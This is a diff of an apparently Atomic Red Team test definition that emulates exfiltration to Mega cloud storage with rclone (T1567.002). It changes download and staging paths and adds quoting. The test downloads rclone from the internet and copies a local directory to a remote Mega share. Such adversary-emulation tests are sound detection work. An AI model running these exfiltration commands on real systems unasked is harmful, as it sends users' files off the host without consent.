@@ -12,7 +12,7 @@ atomic_tests:
     rclone_path:
       description: Directory of rclone.exe
       type: path
-      default: $env:temp\T1567.002\rclone-v*\
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1567.002\rclone-v*\
     rclone_config_path:
       description: Path to rclone's config file (default should be fine)
       type: path
@@ -20,7 +20,7 @@ atomic_tests:
     dir_to_copy:
       description: Directory to copy
       type: string
-      default: $env:temp\T1567.002
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1567.002
     mega_user_account:
       description: Mega user account
       type: string
@@ -38,25 +38,26 @@ atomic_tests:
   - description: |
       rclone must exist at (#{rclone_path})
     prereq_command: |
-      if (Test-Path #{rclone_path}) {exit 0} else {exit 1}
+      if (Test-Path "#{rclone_path}") {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "https://downloads.rclone.org/rclone-current-windows-amd64.zip" -OutFile $env:temp\rclone.zip
-      Expand-archive -path $env:temp\rclone.zip -destinationpath $env:temp\T1567.002\ -force
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://downloads.rclone.org/rclone-current-windows-amd64.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\rclone.zip"
+      Expand-archive -path "PathToAtomicsFolder\..\ExternalPayloads\rclone.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\T1567.002\" -force
   executor:
     command: |
       New-Item #{rclone_config_path}\rclone -ItemType directory
       New-Item #{rclone_config_path}\rclone\rclone.conf
-      cd #{rclone_path}
+      cd "#{rclone_path}"
       .\rclone.exe config create #{remote_share} mega
       set-Content #{rclone_config_path}\rclone\rclone.conf "[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}"
-      .\rclone.exe copy --max-size 1700k #{dir_to_copy} #{remote_share}:test -v
+      .\rclone.exe copy --max-size 1700k "#{dir_to_copy}" #{remote_share}:test -v
     cleanup_command: |
-      cd #{rclone_path}
+      cd "#{rclone_path}"
       .\rclone.exe purge #{remote_share}:test
       .\rclone.exe config delete #{remote_share}:
       Remove-Item #{rclone_config_path}\rclone -recurse -force -erroraction silentlycontinue
       cd c:\
-      Remove-Item $env:temp\rclone.zip
-      Remove-Item $env:temp\T1567.002 -recurse -force
+      Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\rclone.zip"
+      Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\T1567.002" -recurse -force
     name: powershell
     elevation_required: false
